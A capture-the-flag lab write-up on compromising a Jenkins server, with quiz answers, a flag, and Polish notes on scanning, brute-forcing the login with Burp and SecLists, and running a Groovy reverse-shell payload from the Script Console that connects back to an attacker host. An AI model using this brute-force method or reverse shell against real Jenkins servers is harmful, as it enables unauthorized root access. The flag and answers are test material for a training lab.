Task 1:
What does the acronym CVE stand for?
Common Vulnerabilities and Exposures
Task 2:
What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?
confidentiality, integrity, availability
Task 3:
What is the version of the service running on port 8080?
Jetty 9.4.39.v20210325
Task 4:
What version of Jenkins is running on the target?
2.289.1
Task 5:
What type of script is accepted as input on the Jenkins Script Console?
Groovy
Task 6:
What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?
cmd.exe
Task 7:
What is a different command than "ip a" we could use to display our network interfaces' information on Linux?
ifconfig
Task 8:
What switch should we use with netcat for it to use UDP transport mode?
-u
Task 9:
What is the term used to describe making a target host initiate a connection back to the attacker host?
reverse shell
Flag:
9cdfb439c7876e703e307864c9167a15

####
opis przejscia maszyny 
####
nmap -sC -sV -p- TARGET.IP -> http port 8080
pod adresem http://TARGET.IP:8080/login mamy panel logowania
do bruteforce danych uwierzytelniajacych uzylem modulu intruder w burpie, jako payload uzylem top-usernames-shortlist.txt oraz 500-worst-passwords.txt z seclists. 
dlugosc odpowiedzi od serwera dla zapytania root:password roznila sie od reszty wiec postanowilem to sprawdzic ->sukces logowania.
Po zalogowaniu sie widzimy ze na stronie jest zainstalowany groovy script, krotki research wskazuje ze moze byc podatny na reverse shell
sprawdzamy http://TARGET.IP/8080/script
nastepnie payload z PayloadsAllTheThings
####

String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 
zmieniamy host, oraz cmd na /bin/bash poniewaz z zadania 7 wiemy ze VM dziala na linuxie
nasluchujemy nc -lvnp 4242 i dostajemy shell
whoami ->root
cd root
cat flag.txt i otrzymujemy flage
